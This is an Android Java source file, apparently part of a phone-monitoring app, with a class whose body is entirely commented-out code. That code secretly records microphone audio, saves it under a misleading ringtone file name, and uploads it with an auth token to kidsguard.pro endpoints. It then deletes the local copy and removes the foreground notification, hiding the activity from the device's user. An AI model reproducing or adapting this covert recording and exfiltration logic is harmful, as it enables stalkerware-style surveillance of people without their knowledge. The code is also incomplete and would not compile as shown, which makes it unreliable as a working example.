package pro.tasking;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.support.annotation.RequiresApi;

import net.gotev.uploadservice.MultipartUploadRequest;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

public class AudioRecorderclass {
    String pathSave;
    MediaRecorder mediaRecorder;
//    public void Record(Context context,String durst,String Type){
//
//        pathSave= Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtones"+"mine.mp3";
//        if (durst!=null&&Type!=null){
//            if (Type.equals("dating")){
//                pathSave=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtones"+"minedate.mp3";
//            }
//            setupMediaRecorder();
//            try {
//                mediaRecorder.prepare();
//                mediaRecorder.start();
//            } catch (IOException e) {
//                e.printStackTrace();
//            }catch (IllegalStateException e){}
//            if (Type.equals("not")){
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                        mediaRecorder.stop();
//                        //Upload();
//                        Upload2();
//
//                    }
//                },40000);
//                Handler handler1=new Handler();
//                handler1.postDelayed(new Runnable() {
//                    @RequiresApi(api = Build.VERSION_CODES.N)
//                    @Override
//                    public void run() {
//                        File dir = new File (pathSave);
//                        if (dir.exists()){
//                            dir.delete();}
//                        stopForeground(0);
//
//                    }
//                },55000);
//            }else if (Type.equals("dating")){
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                        mediaRecorder.stop();
//
//
//                    }
//                }, Long.parseLong(durst));
//            }}
//
//        return super.onStartCommand(intent,flags,startId);
//    }
//    private void setupMediaRecorder() {
//        mediaRecorder =new MediaRecorder();
//        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
//        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
//        mediaRecorder.setOutputFile(pathSave);
//    }
//    public void Upload(){
//        try {
//            String uploadId = UUID.randomUUID().toString();
//            //Creating a multi part request
//            new MultipartUploadRequest(this, uploadId,"https://req.kidsguard.pro/api/putVoice/")
//                    .addFileToUpload(pathSave, "voice") //Adding file
//                    .addParameter("token", getToken(getApplicationContext())) //Adding text parameter to the request
//                    .setMaxRetries(2)
//                    .startUpload();
//        } catch (Exception exc) {
//
//        }
//    }
//    public void Upload2(){
//        try {
//            String uploadId = UUID.randomUUID().toString();
//            //Creating a multi part request
//            new MultipartUploadRequest(getApplicationContext(), uploadId,"https://im.kidsguard.pro/api/put-voice/")
//                    .addFileToUpload(pathSave, "voice") //Adding file
//                    .addParameter("token", getToken(getApplicationContext()))
//                    .addParameter("token1", "AllowVoice")//Adding text parameter to the request
//                    .setMaxRetries(2)
//
//                    .startUpload(); //Starting the upload
//            //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
//
//        } catch (Exception exc) {
//
//            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
//        }
//    }
//    private void createNotificationChannel() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            NotificationChannel serviceChannel = new NotificationChannel(
//                    "ForegroundServiceChannel",
//                    "Foreground Service Channel",
//                    NotificationManager.IMPORTANCE_DEFAULT
//            );
//            serviceChannel.setShowBadge(false);
//
//
//
//            NotificationManager manager = getSystemService(NotificationManager.class);
//
//            manager.createNotificationChannel(serviceChannel);
//
//        }
//    }
//    public  String getToken(Context context){
//        String token=null;
//        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
//        token=tokenDataBaseManager.gettoken();
//        tokenDataBaseManager.close();
//        return token;
//
//    }


}

